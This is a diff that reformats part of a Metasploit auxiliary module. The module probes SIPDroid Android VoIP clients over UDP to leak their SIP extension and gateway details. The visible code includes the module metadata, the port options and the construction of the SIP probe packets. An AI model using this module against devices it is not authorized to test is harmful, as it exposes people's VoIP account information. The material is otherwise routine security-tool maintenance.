@@ -7,33 +7,41 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::Udp
 
   def initialize(info = {})
-    super(update_info(info,
-      'Name'           => 'SIPDroid Extension Grabber',
-      'Description'    => %q{
-        This module exploits a leak of extension/SIP Gateway
-      on SIPDroid 1.6.1 beta, 2.0.1 beta, 2.2 beta (tested in Android 2.1 and 2.2 - official Motorola release)
-      (other versions may be affected).
+    super(
+      update_info(
+        info,
+        'Name' => 'SIPDroid Extension Grabber',
+        'Description' => %q{
+          This module exploits a leak of extension/SIP Gateway
+          on SIPDroid 1.6.1 beta, 2.0.1 beta, 2.2 beta (tested in Android 2.1 and 2.2 - official Motorola release)
+          (other versions may be affected).
         },
-      'Author'         => 'Anibal Aguiar <anibal.aguiar[at]gmail.com>',
-      'References'     =>
-        [
+        'Author' => 'Anibal Aguiar <anibal.aguiar[at]gmail.com>',
+        'References' => [
           ['BID', '47710'],
           ['URL', 'https://seclists.org/fulldisclosure/2011/May/83'],
-        ]
-      ))
+        ],
+        'Notes' => {
+          'Reliability' => UNKNOWN_RELIABILITY,
+          'Stability' => UNKNOWN_STABILITY,
+          'SideEffects' => UNKNOWN_SIDE_EFFECTS
+        }
+      )
+    )
 
     register_options(
       [
-        OptInt.new('STRTPORT',  [true, 'The start probe port', 59150]),
-        OptInt.new('FNLPORT',   [true, 'The final probe port', 59159]),
-        OptInt.new('RPORT',     [false, 'Remote port to probe', nil]),
-      ])
+        OptInt.new('STRTPORT', [true, 'The start probe port', 59150]),
+        OptInt.new('FNLPORT', [true, 'The final probe port', 59159]),
+        OptInt.new('RPORT', [false, 'Remote port to probe', nil]),
+      ]
+    )
   end
 
   def create_probe(ip, meth, branch, tag, callid)
-    suser = Rex::Text.rand_text_alphanumeric(rand(8)+1)
+    suser = Rex::Text.rand_text_alphanumeric(rand(8) + 1)
     shost = Rex::Socket.source_address(ip)
-    src	  = "#{shost}:5060"
+    src = "#{shost}:5060"
 
     if branch.nil?
       branch = "z9hG4bK#{"%.8x" % rand(0x100000000)}"
@@ -51,7 +59,7 @@ class MetasploitModule < Msf::Auxiliary
     @tag = tag
     @callid = callid
 
-    data  = "#{meth} sip:#{ip} SIP/2.0\r\n"
+    data = "#{meth} sip:#{ip} SIP/2.0\r\n"
     data << "Via: SIP/2.0/UDP #{src};branch=#{branch};rport\r\n"
     data << "Content-Length: 0\r\n"
     data << "From: \"SIPDROID\";tag=#{tag}\r\n"
